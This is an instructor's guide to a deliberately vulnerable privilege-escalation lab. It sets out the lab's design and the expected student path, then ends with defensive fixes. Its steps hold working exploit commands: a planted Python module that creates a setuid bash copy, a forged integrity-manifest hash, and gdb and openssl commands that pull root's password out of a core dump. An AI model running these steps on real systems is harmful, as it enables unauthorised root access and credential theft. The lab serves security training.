# Privilege escalation: instructor notes (Stage 10-14)

**Do not link this file from student-facing pages.** It is intended for
instructors verifying the lab and for a post-exercise debrief.

## Design: one strict path, three tiers, two distinct bug classes

Provisioned by `setup_privesc.sh` (run at container build time and by
`scripts/reset_lab.sh`). There is exactly one account at each tier and
exactly one way to move to the next one:

- **Low -- `appuser`.** No group membership beyond its own, no interesting
  file access, and exactly **one** sudo grant:
  `appuser ALL=(opsuser) NOPASSWD: /opt/shop/scripts/archive_worker.py *`.
  Nothing else. `appuser` cannot edit `archive_worker.py` (root-owned, not
  writable).
- **Mid -- `opsuser`.** Has **no valid password at all** -- the account is
  locked in `/etc/shadow`, and -- deliberately, this design -- **no sudo
  grant whatsoever**. `sudo -l` as opsuser shows nothing. Hop 2 is not a
  sudo/trust-boundary bug; it's direct recovery of root's actual account
  password via memory forensics (see below). The only way to act as
  `opsuser` at all is the Hop 1 exploit.
- **High -- root.** Reached only via the Hop 2 exploit below, using root's
  real (randomly generated, never hardcoded) account password.

### Hop 1 -- appuser -> opsuser: Python import-path hijack + self-signed integrity check (CWE-427 + CWE-354)

`archive_worker.py` (see its own docstring) is a plausible internal tool --
"archive processed images via a pluggable format handler, looked up by
name from a shared outbox directory" -- that does:

```python
sys.path.insert(0, OUTBOX_DIR)
module = __import__(handler_name)
```

`OUTBOX_DIR` (`/opt/shop/backups/outbox/`) is owned `appuser:appuser`, mode
755 -- world-readable so `opsuser`'s import can actually find files there,
but only `appuser` can write into it. Since `appuser` can invoke this
script *as opsuser* via the scoped sudo rule, and can plant any
same-named `.py` file into `OUTBOX_DIR` first, `appuser` fully controls
what `__import__(handler_name)` actually imports -- and that module's
top-level code runs as `opsuser`, because `sudo` performs the real UID
switch before `archive_worker.py` ever starts running.

A second layer sits in front of the import: `_verify_handler()` checks the
handler module's sha256 against a recorded value in `handlers.manifest`
before allowing the import at all -- the kind of fix a prior security
review would plausibly have demanded once CWE-427 is flagged. It's broken
the same way a lot of real "we added a checksum" fixes are: the manifest
that proves integrity lives in the *same* `appuser`-writable `OUTBOX_DIR`
as the modules it's supposed to be checking. `appuser` doesn't need to
forge or crack anything -- it just computes `sha256sum` of its own planted
module and writes that real hash into the manifest itself, alongside the
one legitimate entry (`noop`) seeded at setup time.

### Hop 2 -- opsuser -> root: AES-256-GCM "encryption at rest" with no real key custody (CWE-226 / key-management failure)

`opsuser` has no sudo rule to abuse this time. Instead, `opsuser` can read
`backups/diagnostics/rootwatch.core` -- a genuine ELF core dump,
opsuser-owned mode 440, produced once per setup/reset by running
`rootwatch` (see `rootwatch.c`) under `gdb` and capturing its memory with
`generate-core-file` at the moment it deliberately `abort()`s.

`rootwatch` is a legacy "confirm the admin credential is still correct"
health-check tool: it decrypts `root_secret.enc` (root's actual account
password, AES-256-GCM-encrypted) using `root_secret.key` -- a plain
sibling file it reads directly off disk, because this lab (like a
disappointing number of real deployments) never wired up a real KMS/vault
for it. Both files are root-owned, mode 600 -- `opsuser` cannot read
either one directly. `rootwatch` *does* do one thing right: right after
using the decrypted password, it cleanses that buffer with
`OPENSSL_cleanse()` before crashing -- a real, correct defensive habit, and
it means a plain `strings` pass over the core dump finds no readable
password. What it never touches is `key` and `blob` (nonce || ciphertext
|| tag): those are still fully resident in the stack frame at the moment
`rootwatch` crashes, and both land in the core dump `opsuser` **can**
read.

"Encrypted at rest" bought nothing here: the key was always exactly as
reachable as the ciphertext (right next to it, read by the same process).
The bug isn't "nobody thought about clearing secrets" -- clearly someone
did, for the password. It's that `key` and `blob` didn't read as "secret"
to whoever wrote that cleanup; a 32-byte array and an opaque encrypted
blob don't look dangerous the way a plaintext password does, even though
together they reconstruct it for free. This is CWE-226 (Sensitive
Information Uncleared Before Release) applied *incompletely* -- a very
realistic shape of fix, not a strawman. Recovering the password is
forensics plus cryptography, not a shortcut: `gdb`/`objdump` on the core
file to pull out `key` and `blob` by name (the binary isn't stripped),
then one real `openssl enc -d -aes-256-gcm` (or a few lines of Python
`cryptography`) to turn (key, nonce, tag, ciphertext) back into root's
actual password.

## Expected student path

**Hop 1**, from an `appuser` shell (after Stage 9):
1. `id` -- an ordinary, unprivileged account; no interesting group.
2. `sudo -l` -- shows exactly one rule: `(opsuser) NOPASSWD:
   /opt/shop/scripts/archive_worker.py *`. This is the only lead.
3. `cat /opt/shop/scripts/archive_worker.py` (world-readable) -- see it
   inserts an appuser-writable directory at the *front* of `sys.path`
   before importing a handler module by name (CWE-427), and that it
   checks a sha256 against `handlers.manifest` first.
4. `ls -la /opt/shop/backups/outbox/` -- notice `handlers.manifest` is
   owned `appuser`, same as everything else in the directory.
5. Plant a malicious handler and register it yourself:
   ```bash
   cat > /opt/shop/backups/outbox/evil.py <<'EOF'
   import os
   os.system("cp /bin/bash /tmp/opsbash && chmod u+s /tmp/opsbash")
   EOF
   HASH=$(sha256sum /opt/shop/backups/outbox/evil.py | awk '{print $1}')
   python3 - "$HASH" <<'PYEOF'
   import json, sys
   p = "/opt/shop/backups/outbox/handlers.manifest"
   m = json.load(open(p))
   m["evil"] = sys.argv[1]
   json.dump(m, open(p, "w"))
   PYEOF
   ```
6. `sudo -u opsuser /opt/shop/scripts/archive_worker.py evil`
7. `cat /opt/shop/flags/stage2` -- fails as appuser (not world-readable);
   confirm via the setuid shell from step 5: `/tmp/opsbash -p`.

**Hop 2**, from an `opsuser`-privileged shell (via the setuid helper from
Hop 1):
8. `sudo -l` -- shows nothing. There is no sudo rule to chase this time.
9. `ls -la /opt/shop/backups/` -- `diagnostics/rootwatch.core` is owned
   `opsuser`, readable.
10. `file /opt/shop/backups/diagnostics/rootwatch.core` -- it's an ELF
    core dump. `strings` on it surfaces fragments of `rootwatch.c`'s own
    argv (the paths to `root_secret.key` and `root_secret.enc`) and binary
    noise from `key`/`blob` -- but **not** a readable password: `plaintext`
    was cleansed before the crash, so this alone is a dead end. Worth
    noticing *that* it's a dead end -- the obvious "just grep the dump"
    move doesn't work here, which is itself the signal to switch to real
    forensics instead of trying harder at `strings`/`grep`.
11. Extract the actual bytes reliably with `gdb`:
    ```bash
    gdb -q -batch \
        -ex "print/x *(unsigned char(*)[32])key" \
        /opt/shop/scripts/rootwatch/rootwatch \
        /opt/shop/backups/diagnostics/rootwatch.core
    ```
    (or dump the relevant memory region with `x/256bx $rsp` and locate the
    32-byte key, 12-byte nonce, 16-byte tag, and ciphertext by their known
    lengths/order -- `nonce || ciphertext || tag` in the on-disk blob,
    `key` as a separate local in `main`'s frame.)
12. Reassemble and decrypt:
    ```bash
    openssl enc -d -aes-256-gcm \
        -K "$(xxd -p -c 64 key.bin)" \
        -iv "$(xxd -p -c 64 nonce.bin)" \
        -in ciphertext.bin -out password.txt
    # (recent openssl `enc` needs the tag appended to -in, or use the
    # `cryptography` package's AESGCM.decrypt(nonce, ct+tag, None) instead
    # -- either is a legitimate route to the same plaintext.)
    ```
13. `su -` with the recovered password.
14. Read `/root/final_flag`.

## Why this is a good training vulnerability

- Deterministic and 100% reproducible after `reset_lab.sh` -- the core
  dump is captured explicitly via `gdb generate-core-file`, independent of
  the host's own `/proc/sys/kernel/core_pattern`, so it doesn't depend on
  a kernel version, timing, or an unpatched CVE.
- Two genuinely different bug classes across the chain, each requiring a
  different skill: Python import search-path manipulation plus a
  self-defeating integrity check (Hop 1), and binary/memory forensics plus
  a real AEAD decrypt operation (Hop 2) -- a student can't reuse the same
  intuition twice. Hop 2 also deliberately breaks the "check `sudo -l`
  first" habit Hop 1 teaches: `sudo -l` as `opsuser` shows nothing, forcing
  broader enumeration.
- Not `ALL=(ALL) NOPASSWD:ALL` anywhere, and Hop 2 has no sudo grant at
  all -- the privilege boundary being crossed is a cryptographic/memory
  one, not a sudo misconfiguration.
- **Exactly one path exists at every tier.** `tests/test_privilege_escalation.py`
  asserts the single-sudo-rule property for Hop 1, the absence of any
  sudo rule for `opsuser`, the manifest-in-the-same-writable-directory
  property, and that neither `root_secret.key` nor `root_secret.enc` nor
  `rootwatch` itself is readable/writable by anyone but root.

## If you want to raise the difficulty further

Both hops are already two-step (bypass a defense, then exploit the
underlying bug), but if you want more:

- **Hop 1:** make `handlers.manifest` HMAC-signed with a key opsuser (not
  appuser) holds, so appuser can forge the hash but not a valid signature
  -- forces discovering *that* key is itself reachable some other way
  (recursion opportunity), or genuinely closes the loophole and makes Hop
  1 a dead end on its own (not recommended -- breaks the single-path
  design unless you also add a *replacement* Hop 1 bug).
- **Hop 2:** strip the binary (`strip rootwatch`) so local-variable names
  vanish from the symbol table and the student has to recognize the
  key/nonce/tag/ciphertext purely by length and position in the stack
  frame, not by `gdb print key`. Or compile with `-O2` instead of `-O0`,
  which may relocate/elide some of the intermediate buffers into registers
  that don't appear in the dump at all, requiring the student to notice
  *which* values actually survived and route around the ones that didn't
  -- more realistic, but risks occasionally not leaving enough in the
  dump to succeed, so verify empirically after any such change.
- **Either hop:** add a believable decoy -- a second, inert `.manifest`
  entry or a second, non-credential secret in a second core dump -- that
  looks promising but leads nowhere, to penalize students who stop
  enumerating as soon as they find *something* interesting.

## Defensive fix

- Never trust an integrity-check value stored in the same trust domain as
  the thing it's checking. If pluggable handlers are a real requirement,
  resolve them from a fixed, root-owned registry, and compute/store
  checksums somewhere the account being checked cannot write.
- Never assume "we scrub the plaintext" is the whole fix. Everything
  needed to reconstruct a secret is equally sensitive -- the decryption
  key and the ciphertext included, not just the value they produce.
  Scrubbing one variable and leaving the other two live (as `rootwatch`
  does here) is a realistic *partial* fix, not a safe one. Clear all of
  it immediately after use, disable core dumps for processes that handle
  secrets (`prctl(PR_SET_DUMPABLE, 0)` or `ulimit -c 0` for that service),
  and keep key custody genuinely separate from ciphertext custody (a
  KMS/vault/HSM, not a sibling file).
- Prefer dedicated service accounts with no interactive login and no sudo
  rights of their own, triggered by a systemd timer instead of a
  human/application-invoked sudo rule, for anything resembling Hop 1's
  script in a real deployment.
